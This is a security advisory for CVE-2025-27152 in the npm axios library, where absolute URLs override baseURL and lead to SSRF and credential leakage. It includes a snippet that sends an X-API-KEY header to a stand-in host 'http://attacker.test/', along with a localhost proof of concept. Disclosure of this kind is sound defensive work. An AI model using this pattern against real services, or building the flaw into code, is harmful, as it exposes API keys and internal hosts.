# [H] axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL

## Summary
Severity: High
Advisory: GHSA-jr5f-v2jv-69x6
CVE: CVE-2025-27152
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-03-07
Source: https://github.com/advisories/GHSA-jr5f-v2jv-69x6
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.8.2
- npm: `axios` — affected >=0 <0.30.0

## Details
### Summary

A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463

A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.

### Details

Consider the following code snippet:

```js
import axios from "axios";

const internalAPIClient = axios.create({
  baseURL: "http://example.test/api/v1/users/",
  headers: {
    "X-API-KEY": "1234567890",
  },
});

// const userId = "123";
const userId = "http://attacker.test/";

await internalAPIClient.get(userId); // SSRF
```

In this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.

It is recommended that:

-	When `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.
-	Before sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.

### PoC

Follow the steps below to reproduce the issue:

1.	Set up two simple HTTP servers:

```
mkdir /tmp/server1 /tmp/server2
echo "this is server1" > /tmp/server1/index.html 
echo "this is server2" > /tmp/server2/index.html
python -m http.server -d /tmp/server1 10001 &
python -m http.server -d /tmp/server2 10002 &
```


2.	Create a script (e.g., main.js):

```js
import axios from "axios";
const client = axios.create({ baseURL: "http://localhost:10001/" });
const response = await client.get("http://localhost:10002/");
console.log(response.data);
```

3.	Run the script:

```
$ node main.js
this is server2
```

Even though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.

### Impact

-	Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.
-	SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.
-	Affected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.

## References
- https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6
- https://nvd.nist.gov/vuln/detail/CVE-2025-27152
- https://github.com/axios/axios/issues/6463
- https://github.com/axios/axios/pull/6829
- https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde
- https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f
- https://github.com/axios/axios
- https://github.com/axios/axios/releases/tag/v1.8.2
